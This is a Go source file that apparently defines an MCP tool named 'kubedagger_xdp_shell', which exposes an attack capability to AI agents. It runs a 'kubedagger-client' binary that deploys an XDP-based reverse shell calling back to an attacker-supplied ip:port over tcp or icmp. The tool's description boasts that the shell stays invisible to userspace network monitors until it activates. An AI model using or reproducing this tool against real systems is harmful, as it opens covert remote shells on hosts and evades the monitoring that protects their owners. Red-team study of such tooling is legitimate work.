package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type XDPShellInput struct {
	Connect  string `json:"connect,omitempty"`
	Protocol string `json:"protocol,omitempty"`
}

type XDPShellTool struct {
	exec executor.Executor
}

func NewXDPShell(exec executor.Executor) *XDPShellTool {
	return &XDPShellTool{exec: exec}
}

func (t *XDPShellTool) Name() string { return "kubedagger_xdp_shell" }

func (t *XDPShellTool) Description() string {
	return "Deploy an XDP-based reverse shell that connects back to a listener at the given ip:port. The trigger operates at the packet-processing layer, making it invisible to userspace network monitors until activation."
}

func (t *XDPShellTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"connect": {
				"type": "string",
				"description": "Callback listener as ip:port, e.g. '10.0.0.1:4444'"
			},
			"protocol": {
				"type": "string",
				"enum": ["tcp", "icmp"],
				"description": "Callback protocol (default: tcp)"
			}
		}
	}`)
}

func (t *XDPShellTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input XDPShellInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateIPPort(input.Connect); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"xdp-shell"}
	if input.Connect != "" {
		args = append(args, "--connect", input.Connect)
	}
	if input.Protocol != "" {
		args = append(args, "--protocol", input.Protocol)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger xdp-shell failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger XDP Shell\n\n")
	if output == "" {
		sb.WriteString("Operation completed.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
